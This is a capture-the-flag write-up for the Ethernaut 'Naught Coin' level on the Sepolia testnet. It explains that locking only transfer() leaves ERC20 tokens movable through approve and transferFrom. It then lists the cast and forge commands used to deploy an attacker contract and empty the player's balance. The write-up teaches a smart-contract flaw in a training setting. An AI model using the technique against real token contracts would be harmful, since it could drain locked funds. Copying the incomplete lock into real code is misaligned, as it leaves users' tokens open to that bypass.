# Ethernaut Challenge 15 — Naught Coin

This challenge shows that restricting `transfer()` is not enough to lock ERC20 tokens.

The goal is to get your `NaughtCoin` balance to `0`, even though the token is supposed to be locked for 10 years.

Instance address:

```bash
0xde793CbdCc4B70eE335b29638e066A4705a565df
````

---

## 🎯 Goal

Reduce the player balance to `0`.

---

## 🧠 Understanding the challenge

`NaughtCoin` is an ERC20 token, but it overrides the transfer logic so that the player cannot call `transfer()` before the lock period expires.

At first glance, this seems to prevent moving tokens.

However, ERC20 supports more than just `transfer()`.

In addition to:

```solidity
transfer(address to, uint256 amount)
```

there is also:

```solidity
approve(address spender, uint256 amount)
transferFrom(address from, address to, uint256 amount)
```

So even if `transfer()` is blocked, tokens can still be moved by:

1. approving another address as spender
2. letting that address call `transferFrom()`

👉 The weakness is that the lock applies to direct transfers, but it does not prevent the ERC20 approval flow.

---

## 🔍 Inspect the token state

Set the instance address:

```bash
NAUGHT_COIN_SEPOLIA=0xde793CbdCc4B70eE335b29638e066A4705a565df
```

Player address:

```bash
0xeCF94300dD67bB8c31F41BE3a2136D3f0abFb0B0
```

Check the player balance:

```bash
cast call $NAUGHT_COIN_SEPOLIA \
    "balanceOf(address)" 0xeCF94300dD67bB8c31F41BE3a2136D3f0abFb0B0 \
    --rpc-url $SEPOLIA_RPC_URL
```

Result:

```bash
0x00000000000000000000000000000000000000000000d3c21bcecceda1000000
```

Convert it to decimal:

```bash
cast --to-dec 0x00000000000000000000000000000000000000000000d3c21bcecceda1000000
```

Result:

```bash
1000000000000000000000000
```

Since `NaughtCoin` uses 18 decimals, this corresponds to:

```bash
1000000
```

tokens.

Now check the total supply:

```bash
cast call $NAUGHT_COIN_SEPOLIA \
    "totalSupply()" \
    --rpc-url $SEPOLIA_RPC_URL
```

Result:

```bash
0x00000000000000000000000000000000000000000000d3c21bcecceda1000000
```

So the player owns the full token supply.

---

## 🧪 Attacker contract


To exploit the level, I wrote a helper contract that calls `transferFrom()` after being approved by the player.

This contract:

* reads the caller token balance
* checks that the caller approved the exact amount
* pulls the tokens using `transferFrom()`

👉 Implementation: [NaughtCoinAttacker.sol](NaughtCoinAttacker.sol)

---

## 🚀 Execute on Sepolia

Deploy the attacker contract:

```bash
forge create src/challenge-15-naught-coin/NaughtCoinAttacker.sol:NaughtCoinAttacker \
  --rpc-url $SEPOLIA_RPC_URL \
  --account ethernaut \
  --broadcast \
  --constructor-args $NAUGHT_COIN_SEPOLIA
```

Deployed contract:

```bash
0x5ae4Af04F504b633ebFb739eD14cb594b2b2a641
```

Save it:

```bash
NAUGHT_COIN_ATTACKER_SEPOLIA=0x5ae4Af04F504b633ebFb739eD14cb594b2b2a641
```

---

## ✅ Step 1 — Approve the attacker contract

Now approve the attacker contract to spend the full player balance.

Important: `approve()` must be called on the `NaughtCoin` contract, not on the attacker contract.

```bash
cast send $NAUGHT_COIN_SEPOLIA \
    "approve(address,uint256)" $NAUGHT_COIN_ATTACKER_SEPOLIA 1000000000000000000000000 \
    --rpc-url $SEPOLIA_RPC_URL \
    --account ethernaut
```

Transaction hash:

```bash
0xff8a7212d1dc437585b32219043e84f53c81968350178583e6cb1fa50ded78d1
```

Verify the allowance:

```bash
cast call $NAUGHT_COIN_SEPOLIA \
    "allowance(address,address)" 0xeCF94300dD67bB8c31F41BE3a2136D3f0abFb0B0 $NAUGHT_COIN_ATTACKER_SEPOLIA \
    --rpc-url $SEPOLIA_RPC_URL
```

Result:

```bash
0x00000000000000000000000000000000000000000000d3c21bcecceda1000000
```

The approval is now in place.

---

## ✅ Step 2 — Pull the tokens with `transferFrom()`

Call the attacker contract:

```bash
cast send $NAUGHT_COIN_ATTACKER_SEPOLIA \
    "attack()" \
    --rpc-url $SEPOLIA_RPC_URL \
    --account ethernaut
```

Transaction hash:

```bash
0x2fb3518d17f413cee60ea7678e5c0d957c0b7aed67299c4c150246ed412ddca8
```

The attacker contract now transfers all tokens from the player address to itself using `transferFrom()`.

---

## ✅ Step 3 — Verify the result

Check the player balance again:

```bash
cast call $NAUGHT_COIN_SEPOLIA \
    "balanceOf(address)" 0xeCF94300dD67bB8c31F41BE3a2136D3f0abFb0B0 \
    --rpc-url $SEPOLIA_RPC_URL
```

Result:

```bash
0x0000000000000000000000000000000000000000000000000000000000000000
```

The player balance is now `0`.

Challenge solved ✅




